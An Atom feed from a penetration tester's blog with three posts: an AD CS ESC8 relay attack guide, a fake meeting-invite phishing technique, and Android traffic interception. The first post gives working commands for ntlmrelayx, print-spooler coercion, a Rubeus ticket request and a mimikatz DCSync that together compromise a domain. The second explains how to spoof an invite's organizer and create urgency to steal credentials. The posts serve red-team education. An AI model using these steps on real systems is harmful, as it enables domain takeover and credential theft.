<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.1.1">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2021-06-23T19:37:48+02:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">Ex Android Dev</title><subtitle>cyber security blog posts</subtitle><author><name>ExAndroidDev</name></author><entry><title type="html">AD CS relay attack - practical guide</title><link href="http://localhost:4000/2021/06/23/ad-cs-relay-attack-practical-guide/" rel="alternate" type="text/html" title="AD CS relay attack - practical guide" /><published>2021-06-23T00:00:00+02:00</published><updated>2021-06-23T00:00:00+02:00</updated><id>http://localhost:4000/2021/06/23/ad-cs-relay-attack-practical-guide</id><content type="html" xml:base="http://localhost:4000/2021/06/23/ad-cs-relay-attack-practical-guide/">&lt;p&gt;Unless you are living under the rock, you have seen that recently &lt;a href=&quot;https://twitter.com/harmj0y&quot; target=&quot;blank&quot;&gt;@harmj0y&lt;/a&gt; and &lt;a href=&quot;https://twitter.com/tifkin_&quot; target=&quot;blank&quot;&gt;@tifkin_&lt;/a&gt;  published their amazing research on Active Directory Certificate Services (AD CS). If you haven’t checked it out already read their &lt;a href=&quot;https://posts.specterops.io/certified-pre-owned-d95910965cd2&quot; target=&quot;blank&quot;&gt;post&lt;/a&gt; first.&lt;/p&gt;

&lt;p&gt;While reading their research, one specific misconfiguration caught my attention, it was “NTLM Relay to AD CS HTTP Endpoints — ESC8”. In their blog post and whitepaper, they explain it in more detail, but basically, this misconfiguration lets the attacker relay user/machine authentication to the AD CS server and obtain a user/machine certificate. Once the attacker obtains the certificate, the attacker can request user/machine TGT and become that user/machine on the network.&lt;/p&gt;

&lt;p&gt;Since there was not public PoC for this misconfiguration and I had an upcoming pentest, I’ve decided to dig into it myself and try to implement it. 
I’ve ended up implementing this attack in impacket’s “ntlmrelayx.py” tool. Currently it’s an active &lt;a href=&quot;https://github.com/SecureAuthCorp/impacket/pull/1101&quot; target=&quot;blank&quot;&gt;pull request&lt;/a&gt;.&lt;/p&gt;

&lt;h3 id=&quot;how-to-perform-the-attack&quot;&gt;How to perform the attack?&lt;/h3&gt;
&lt;p&gt;To perform the attack we need ntlmrelayx listening for authentication and relaying it to the AD CS  server, as well as a way to coerce user/machine NTLM authentication to us.
There are plenty of ways of coercing user/machine authentication to a specific server, but for this guide, I will demonstrate coercing machine’s authentication via well known “Print Spooler” bug.&lt;/p&gt;
&lt;h5 id=&quot;oh-yeah-if-you-didnt-know-the-print-spooler-attack-is-still-valid-and-working-fine-on-up-to-date-windows-servers&quot;&gt;&lt;em&gt;Oh yeah if you didn’t know, the print spooler attack is still valid and working fine on up-to-date windows servers.&lt;/em&gt;&lt;/h5&gt;
&lt;p&gt;&lt;br /&gt;
Run the ntlmrelayx.py and set your Certificate Authority (CA) as a target:&lt;/p&gt;
&lt;div class=&quot;language-text highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;python3 ntlmrelayx.py -t http://&amp;lt;ca-server&amp;gt;/certsrv/certfnsh.asp -smb2support --adcs
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;To coerce authentication of a domain controller machine I will use &lt;a href=&quot;https://github.com/NotMedic/NetNTLMtoSilverTicket/blob/master/dementor.py&quot; target=&quot;blank&quot;&gt;dementor.py&lt;/a&gt; script to exploit the print spooler bug:&lt;/p&gt;
&lt;div class=&quot;language-text highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;python3 dementor.py &amp;lt;listener&amp;gt; &amp;lt;target&amp;gt; -u &amp;lt;username&amp;gt; -p &amp;lt;password&amp;gt; -d &amp;lt;domain&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h5 id=&quot;quick-tip-if-dementorpy-throws-an-error-in-line-10-change-configparser-to-the-lowercase-configparser&quot;&gt;Quick tip, if dementor.py throws an error, in line 10 change “ConfigParser” to the lowercase “configparser”&lt;/h5&gt;
&lt;p&gt;&lt;br /&gt;
&lt;img src=&quot;/assets/ntlmrelayx-dementor.png&quot; alt=&quot;ntlmrelayx-dementor&quot; class=&quot;center-image&quot; /&gt;&lt;/p&gt;

&lt;p&gt;If authentication is successful ntlmrelayx will generate a new Certificate Sign Request (CSR), submit it to the CA to be signed, and download the certificate. The certificate will be displayed as a base64 blob to make it easier to use with Rubeus.&lt;/p&gt;

&lt;p&gt;Once you’ve obtained the certificate you have basically owned the user/machine. All you have to do now is to request a TGT with the certificate. You can do this with &lt;a href=&quot;https://github.com/GhostPack/Rubeus&quot; target=&quot;blank&quot;&gt;Rubeus&lt;/a&gt;.&lt;/p&gt;

&lt;div class=&quot;language-text highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Rubeus.exe asktgt /user:&amp;lt;user&amp;gt; /certificate:&amp;lt;base64-certificate&amp;gt; /ptt
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;language-text highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Rubeus.exe asktgt /user:dc1$ /certificate:MIIRdQIBAzCCET8GCSqGSIb3DQEHAaCCETAEghEsMIIRKDCCB18GCSqGSIb3DQEHBqCCB1AwggdMAgEAMIIHRQYJKoZIhvcNAQcBMBwGCiqGSIb3DQEMAQMwDgQIMlK4N+sfacMCAggAgIIHGPCx+sJcjQRGbQANC3ePKIKAOfNeI9wgyOOXfMBWms3IAtVA2EZ0b78ky5vomY9alQdXqnDsNwdTSiBwCrM2pjrOCKkK7k12ZUdyMmL1fHC6tEv1ZQ1ERua9efEJF/uECAirxbWtwG/PImwzYNK+H8Pf0d6Yn763640sZIz6ZCe4aSJLlnhyuCjPfvB+CPIYKdmOhK8sNVb28xii71...&amp;lt;snip&amp;gt;...+NfrHtK8fzQxPG8vcBKrbW5104J399ScrUqg5tb3E3wsJeOFrxw3EKTRDElMCMGCSqGSIb3DQEJFTEWBBRJcYgdQp5tsPzn4fZ44dvnJGD/4TAtMCEwCQYFKw4DAhoFAAQUpPhhGxvtl866a+BRgIx397lDNg4ECNraSKImUUXS /ptt
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;&lt;br /&gt;
&lt;img src=&quot;/assets/rubeus.png&quot; alt=&quot;ntlmrelayx-dementor&quot; class=&quot;center-image&quot; /&gt;
&lt;br /&gt;
&lt;img src=&quot;/assets/klist.png&quot; alt=&quot;ntlmrelayx-dementor&quot; class=&quot;center-image&quot; /&gt;&lt;/p&gt;

&lt;p&gt;TGT has been obtained and imported successfully. To make sure it works you can now perform a DCSync attack with mimikatz.&lt;/p&gt;

&lt;div class=&quot;language-text highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;mimikatz # lsadump::dcsync /user:krbtgt
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;/assets/mimikatz.png&quot; alt=&quot;ntlmrelayx-dementor&quot; class=&quot;center-image&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;mitigation&quot;&gt;Mitigation&lt;/h3&gt;
&lt;p&gt;For mitigation check out the official &lt;a href=&quot;https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf&quot; target=&quot;blank&quot;&gt;whitepaper&lt;/a&gt; under the “Harden AD CS HTTP Endpoints – PREVENT8” title.&lt;/p&gt;

&lt;h2 id=&quot;conclusion&quot;&gt;Conclusion&lt;/h2&gt;
&lt;p&gt;In this guide, I have demonstrated how you can obtain a domain controller’s machine certificate and abuse it to compromise the whole domain. Keep in mind this can attack can be used to obtain certificates of other windows (server) machines (not only domain controllers) as well as user accounts. If you would like to perform the attack against user accounts you would need to somehow coerce a user to authenticate to your server (where ntlmrelayx is running) as well as run ntlmrelayx with the “–template User” flag. In the future post, I will show how to attack the user accounts with this attack.&lt;/p&gt;

&lt;h3 id=&quot;credits&quot;&gt;Credits&lt;/h3&gt;
&lt;p&gt;All credits for this research goes to &lt;a href=&quot;https://twitter.com/harmj0y&quot; target=&quot;blank&quot;&gt;@harmj0y&lt;/a&gt; and &lt;a href=&quot;https://twitter.com/tifkin_&quot; target=&quot;blank&quot;&gt;@tifkin_&lt;/a&gt;. I’ve just implemented the attack in the impacket’s ntlmrelayx tool and demonstrated how to use it.&lt;/p&gt;

&lt;p&gt;The end!&lt;/p&gt;</content><author><name>ExAndroidDev</name></author><summary type="html">Unless you are living under the rock, you have seen that recently @harmj0y and @tifkin_ published their amazing research on Active Directory Certificate Services (AD CS). If you haven’t checked it out already read their post first.</summary></entry><entry><title type="html">Phishing with fake meeting invite</title><link href="http://localhost:4000/2021/04/24/phishing-with-fake-meeting-invite/" rel="alternate" type="text/html" title="Phishing with fake meeting invite" /><published>2021-04-24T00:00:00+02:00</published><updated>2021-04-24T00:00:00+02:00</updated><id>http://localhost:4000/2021/04/24/phishing-with-fake-meeting-invite</id><content type="html" xml:base="http://localhost:4000/2021/04/24/phishing-with-fake-meeting-invite/">&lt;p&gt;Have you ever thought about how teams or google meet invites work?&lt;/p&gt;

&lt;p&gt;Recently I was tasked with a social engineering engagement and a random thought crosses my mind, how meeting invites actually work and could I abuse it somehow.&lt;/p&gt;

&lt;p&gt;Of course, it turns out someone already thought of that and this method had been used in the wild, but no one explains how it actually works.
Since I couldn’t find any blog that technically describes this attack I dig into it myself and in this blog post I will try to explain to you how it works and how you as a pentester/red teamer can include it into your offensive techniques.&lt;/p&gt;

&lt;h3 id=&quot;what-was-my-goal-for-this-phishing-attack&quot;&gt;What was my goal for this phishing attack?&lt;/h3&gt;

&lt;p&gt;Send a fake meeting invite and create a sense of urgency so the target doesn’t pay much attention and click my link which asks for credentials.&lt;/p&gt;

&lt;p&gt;The usual use case for creating a teams meeting (in outlook) works like this:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;click the “New teams meeting” button&lt;/li&gt;
  &lt;li&gt;new email page opens with an email body pre-populated with teams template and meeting URL&lt;/li&gt;
  &lt;li&gt;set meeting title and select attendees&lt;/li&gt;
  &lt;li&gt;click send and magically your attendees receive a fancy looking email where they can accept or deny a meeting invite&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;em&gt;Creating a meeting in outlook&lt;/em&gt;:
&lt;img src=&quot;/assets/create_meeting.png&quot; alt=&quot;create_meeting&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;em&gt;Meeting invite arrived in outlook&lt;/em&gt;:
&lt;img src=&quot;/assets/meeting_invite.png&quot; alt=&quot;meeting_invite&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;so-what-actually-happened-and-why-does-this-invite-look-so-fancy&quot;&gt;So what actually happened and why does this invite look so fancy?&lt;/h3&gt;
&lt;p&gt;When you create a meeting invite you are simply sending a normal email with the iCalendar object as an attachment.
Depending on the receiver’s client and how it processes the iCalendar object, you get a fancy-looking email or just a simple email with an attachment.
In the image below you can see how it looks like when you receive teams meeting invite in protonmail.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/protonmail_receives_outlook_meeting_invite.png&quot; alt=&quot;protonmail_receives_outlook_meeting_invite&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;what-exactly-is-an-icalendar-object&quot;&gt;What exactly is an iCalendar object?&lt;/h3&gt;
&lt;p&gt;According to  &lt;a href=&quot;https://en.wikipedia.org/wiki/ICalendar&quot; target=&quot;_blank&quot;&gt;wikipedia&lt;/a&gt;:&lt;/p&gt;

&lt;p&gt;“The Internet Calendaring and Scheduling Core Object Specification (iCalendar) is a media type which allows users to store and exchange calendaring and scheduling information such as events, to-dos, journal entries, and free/busy information. Files formatted according to the specification usually have an extension of .ics”&lt;/p&gt;

&lt;p&gt;iCalendar is supported by Outlook, Google calendar, Yahoo calendar, Apple calendar, and many more. 
In this post, I am focusing on outlook.&lt;/p&gt;

&lt;p&gt;Below you can see the iCalendar object of the teams meeting invite. I have simply sent a meeting invite to my protonmail address and just downloaded it and read the attachment.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;BEGIN:VCALENDAR
METHOD:REQUEST
PRODID:Microsoft Exchange Server 2010
VERSION:2.0
BEGIN:VTIMEZONE
TZID:GTB Standard Time
BEGIN:STANDARD
DTSTART:16010101T040000
TZOFFSETFROM:+0300
TZOFFSETTO:+0200
RRULE:FREQ=YEARLY;INTERVAL=1;BYDAY=-1SU;BYMONTH=10
END:STANDARD
BEGIN:DAYLIGHT
DTSTART:16010101T030000
TZOFFSETFROM:+0200
TZOFFSETTO:+0300
RRULE:FREQ=YEARLY;INTERVAL=1;BYDAY=-1SU;BYMONTH=3
END:DAYLIGHT
END:VTIMEZONE
BEGIN:VEVENT
ORGANIZER;CN=ExAndroid Developer:mailto:&amp;lt;redacted&amp;gt;@outlook.com
ATTENDEE;ROLE=REQ-PARTICIPANT;PARTSTAT=NEEDS-ACTION;RSVP=TRUE;CN=&amp;lt;redacted&amp;gt;@protonmail.com:mailto:&amp;lt;redacted&amp;gt;@protonmail.com
DESCRIPTION;LANGUAGE=en-US:&amp;lt;stripped&amp;gt;\n\n
UID:040000008200E00074C5B7101A82E00800000000508CC0468E28D701000000000000000
 01000000096DF011F20A29943A70B5DA5047021A5
SUMMARY;LANGUAGE=en-US:Test meeting
DTSTART;TZID=GTB Standard Time:20210403T000000
DTEND;TZID=GTB Standard Time:20210404T000000
CLASS:PUBLIC
PRIORITY:5
DTSTAMP:20210403T103619Z
TRANSP:OPAQUE
STATUS:CONFIRMED
SEQUENCE:0
LOCATION;LANGUAGE=en-US:Microsoft Teams Meeting
X-MICROSOFT-CDO-APPT-SEQUENCE:0
X-MICROSOFT-CDO-OWNERAPPTID:-570210331
X-MICROSOFT-CDO-BUSYSTATUS:TENTATIVE
X-MICROSOFT-CDO-INTENDEDSTATUS:BUSY
X-MICROSOFT-CDO-ALLDAYEVENT:FALSE
X-MICROSOFT-CDO-IMPORTANCE:1
X-MICROSOFT-CDO-INSTTYPE:0
X-MICROSOFT-SKYPETEAMSMEETINGURL:https://teams.microsoft.com/l/meetup-join/
 19%3ameeting_YmM1MjRmMTktYjA2N&amp;lt;stripped&amp;gt;cd8%22%7d
X-MICROSOFT-SCHEDULINGSERVICEUPDATEURL:https://api.scheduler.teams.microsof
 t.com/teams/dc&amp;lt;stripped&amp;gt;DAyMmZj@thread.v2/0
X-MICROSOFT-SKYPETEAMSPROPERTIES:{&quot;cid&quot;:&quot;19:meeting_YmM1MjRmMTktYjA2Ny00YWQ
 4LWI1NWEtZmE1NGVlMDAyMmZj@thread.v2&quot;\,&quot;private&quot;:true\,&quot;type&quot;:0\,&quot;mid&quot;:0\,&quot;
 rid&quot;:0\,&quot;uid&quot;:null}
X-MICROSOFT-ONLINEMEETINGCONFLINK:conf:sip:&amp;lt;redacted&amp;gt;\;gruu\;opaque=
 app:conf:focus:id:teams:2:0!19:meeting_YmM1MjRmMTktYjA2Ny00YWQ4LWI1NWEtZmE
 1NGVlMDAyMmZj-thread.v2!56474ffc245241c5ab4081a127cc1cd8!dcf23acb18fc41d28
 6acf752f1ca658d
X-MICROSOFT-DONOTFORWARDMEETING:FALSE
X-MICROSOFT-DISALLOW-COUNTER:FALSE
X-MICROSOFT-LOCATIONS:[ { &quot;DisplayName&quot; : &quot;Microsoft Teams Meeting&quot;\, &quot;Loca
 tionAnnotation&quot; : &quot;&quot;\, &quot;LocationSource&quot; : 0\, &quot;Unresolved&quot; : false\, &quot;Loca
 tionUri&quot; : &quot;&quot; } ]
BEGIN:VALARM
DESCRIPTION:REMINDER
TRIGGER;RELATED=START:-PT15M
ACTION:DISPLAY
END:VALARM
END:VEVENT
END:VCALENDAR
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The basic thing to understand here is that every iCalendar object starts with the &lt;em&gt;“BEGIN:VCALENDAR”&lt;/em&gt; and ends with the &lt;em&gt;“END:VCALENDAR”&lt;/em&gt;.
The meeting part is between &lt;em&gt;“BEGIN:VEVENT”&lt;/em&gt; and &lt;em&gt;“END:VEVENT”&lt;/em&gt;. Inside your event, you specify so-called components. 
Usually, not all of the components are required and in my POC you can find a stripped-down ics file that contains only necessary ones. Most of the components are self-explained but I will mark off the most interesting ones.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;ORGANIZER&lt;/strong&gt; - specifies meeting organizer name and email address. You can set any email and name here so it looks like the meeting invite is coming from that person.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;ATTENDEE&lt;/strong&gt; - specifies meeting attendee. If you need more attendees you would have multiple ATTENDEE components. Keep in mind attendees won’t receive a meeting invite email, this is just for the display. You can easily fake that 30 persons attend the meeting when you actually send an email to a single target.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;X-MICROSOFT-SKYPETEAMSMEETINGURL&lt;/strong&gt; - if you specify this component meeting reminder will have the “Join Online” button displayed. Unfortunately, when clicked, it will try to open a specified URL via desktop teams application and fail.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;DTSTART, DTSTAMP, DTEND&lt;/strong&gt; - specifies the time of the meeting and how long it lasts. I did a neat trick here and set the meeting start time to 5 minutes before the current time, that way it looks like you are late 5 minutes for the meeting. When the target receives an email, outlook processes it as a meeting invite, it seems that the meeting started 5 minutes ago and immediately displays a reminder on the screen. It helps encourage urgency.&lt;/p&gt;

&lt;p&gt;The result looks like this:
&lt;img src=&quot;/assets/end_result.png&quot; alt=&quot;end_result&quot; /&gt;&lt;/p&gt;

&lt;p&gt;You can check out my POC at &lt;a href=&quot;https://github.com/ExAndroidDev/fakemeeting/&quot; target=&quot;_blank&quot;&gt;github&lt;/a&gt; and edit the script and templates to suit your needs.&lt;/p&gt;

&lt;p&gt;Keed in mind I’ve just showed how outlook handles the meeting invites. This should work on any email provider/client that processes ics attachements.&lt;/p&gt;

&lt;p&gt;If you have any questions hit me up on twiter at &lt;a href=&quot;https://twitter.com/ExAndroidDev&quot; target=&quot;_blank&quot;&gt;@ExAndroidDev&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;Then end!&lt;/p&gt;</content><author><name>ExAndroidDev</name></author><summary type="html">Have you ever thought about how teams or google meet invites work?</summary></entry><entry><title type="html">Capture all android network traffic</title><link href="http://localhost:4000/2021/03/21/capture-all-android-network-traffic/" rel="alternate" type="text/html" title="Capture all android network traffic" /><published>2021-03-21T00:00:00+01:00</published><updated>2021-03-21T00:00:00+01:00</updated><id>http://localhost:4000/2021/03/21/capture-all-android-network-traffic</id><content type="html" xml:base="http://localhost:4000/2021/03/21/capture-all-android-network-traffic/">&lt;p&gt;So you are performing a pentest on an android app and you have got into a situation where basic certificate pinning bypass doesn’t work. Or you have been dealing with custom protocol instead of good ol’ HTTP. The goal of this post is to teach you how to capture any network traffic on your android device (no root required).&lt;/p&gt;

&lt;p&gt;How does it work you ask? We are going to use a fantastic app, provided by Andrey Egorov(&lt;a href=&quot;https://github.com/egorovandreyrm&quot; target=&quot;_blank&quot;&gt;@egorovandreyrm&lt;/a&gt;.), &lt;a href=&quot;https://play.google.com/store/apps/details?id=com.egorovandreyrm.pcapremote&quot; target=&quot;_blank&quot;&gt;pcap remote&lt;/a&gt;.
It works by creating a VPN connection and capturing all the traffic going through that connection and redirecting it to the wireshark where we can analyze it in real-time.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;
Prerequisites:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;android device/emulator&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://ibotpeaches.github.io/Apktool/install/&quot; target=&quot;_blank&quot;&gt;apktool&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://www.wireshark.org/download.html&quot; target=&quot;_blank&quot;&gt;wireshark&lt;/a&gt; (version 3.0+)&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://play.google.com/store/apps/details?id=com.egorovandreyrm.pcapremote&quot; target=&quot;_blank&quot;&gt;pcap remote&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;br /&gt;
Let’s start..&lt;/p&gt;

&lt;p&gt;If you are testing on an android version greater than 7.0 you are going to need to tamper with an apk a little, since google changed network security policy and made it “harder” for us to play. 
Basically what we need to do is to modify the application to accept any self-signed CA so we can intercept and decrypt the traffic.
For this example, I’m going to use ‘twitter’ android app. Let me show you.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
&lt;h2 id=&quot;modify-target-app&quot;&gt;Modify target app&lt;/h2&gt;
&lt;p&gt;Use apktool to decompile your apk.&lt;/p&gt;
&lt;div class=&quot;language-text highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;apktool d twitter.apk
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;In AndroidManifest.xml edit application tag and add ‘networkSecurityConfig’ parameter. Your target application might already have this value set, in that case you can skip this step.&lt;/p&gt;
&lt;div class=&quot;language-text highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;android:networkSecurityConfig=&quot;@xml/network_security_config&quot;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;&lt;img src=&quot;/assets/twitter-andrmanifest-modified.png&quot; alt=&quot;twitter-android-manifest-modified&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Create/edit network security configuration file. It is stored at location specified in the application tag in AndroidManifest. By default its location is:  ‘res/xml/network_security_config.xml’.&lt;/p&gt;

&lt;p&gt;Edit it to look like this:&lt;/p&gt;
&lt;div class=&quot;language-text highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&amp;gt;
&amp;lt;network-security-config&amp;gt;
    &amp;lt;base-config cleartextTrafficPermitted=&quot;true&quot;&amp;gt;
        &amp;lt;trust-anchors&amp;gt;
            &amp;lt;certificates src=&quot;system&quot; /&amp;gt;
            &amp;lt;certificates src=&quot;user&quot; /&amp;gt;
        &amp;lt;/trust-anchors&amp;gt;
    &amp;lt;/base-config&amp;gt;
&amp;lt;/network-security-config&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Recompile the apk, sign it and install it on the device.&lt;/p&gt;
&lt;div class=&quot;language-text highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;apktool b twitter -o twitter-patch.apk
keytool -genkey -v -keystore key.keystore -alias sign -keyalg RSA -keysize 2048 -validity 10000
jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore key.keystore twitter-patch.apk sign
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
&lt;h2 id=&quot;setup-pcap-remote&quot;&gt;Setup pcap remote&lt;/h2&gt;
&lt;p&gt;Now let’s setup pcap remote.&lt;/p&gt;

&lt;p&gt;First we are going to install ssl certificate. Tap on 3 dots in top right corner, then settings and then ‘Install’ under ‘SSL Certificate’ category, follow the installation dialogs and set the device password if prompted.
&lt;img src=&quot;/assets/pcap-remote-install-cert.png&quot; alt=&quot;pcap-remote-install-cert&quot; class=&quot;center-image&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Make sure to select ‘SSH Server’ as capturing mode and toggle ‘Make HTTPS/TLS connections decryptable’ .
&lt;img src=&quot;/assets/pcap-setup.png&quot; alt=&quot;pcap-setup&quot; class=&quot;center-image&quot; /&gt;&lt;/p&gt;

&lt;p&gt;On the top click on the triangle icon with number one in it and select your target application.
&lt;img src=&quot;/assets/pcap-triangle.png&quot; alt=&quot;pcap-setup&quot; class=&quot;center-image&quot; /&gt;
&lt;img src=&quot;/assets/pcap-chose-app.png&quot; alt=&quot;pcap-setup&quot; class=&quot;center-image&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
&lt;h2 id=&quot;setup-wireshark&quot;&gt;Setup wireshark&lt;/h2&gt;
&lt;p&gt;Now it’s time to connect wireshark with pcap remote.&lt;br /&gt;
&lt;strong&gt;NOTE: If you are using android emulator for testing, make sure to portforward the port.&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&quot;language-text highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;adb forward tcp:15432 tcp:15432
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Open wireshark and select ‘SSH remote capture: sshdump’.
&lt;img src=&quot;/assets/wireshark-sshdump.png&quot; alt=&quot;pcap-setup&quot; class=&quot;center-image&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Enter your phone’s IP address (or 127.0.0.1 if you are working with an emulator) and port that pcap remote is running on. Also on the ‘Authentication’ tab enter any ssh username and password and click start.
&lt;img src=&quot;/assets/wireshark-ssh-server.png&quot; alt=&quot;pcap-setup&quot; class=&quot;center-image&quot; /&gt;
&lt;img src=&quot;/assets/wireshark-ssh-auth.png&quot; alt=&quot;pcap-setup&quot; class=&quot;center-image&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Start your application and analyze decrypted traffic in realtime.
&lt;img src=&quot;/assets/wireshark-decrypted-1.png&quot; alt=&quot;pcap-setup&quot; class=&quot;center-image&quot; /&gt;
&lt;img src=&quot;/assets/wireshark-decrypted-2.png&quot; alt=&quot;pcap-setup&quot; class=&quot;center-image&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The end!&lt;/p&gt;</content><author><name>ExAndroidDev</name></author><summary type="html">So you are performing a pentest on an android app and you have got into a situation where basic certificate pinning bypass doesn’t work. Or you have been dealing with custom protocol instead of good ol’ HTTP. The goal of this post is to teach you how to capture any network traffic on your android device (no root required).</summary></entry></feed>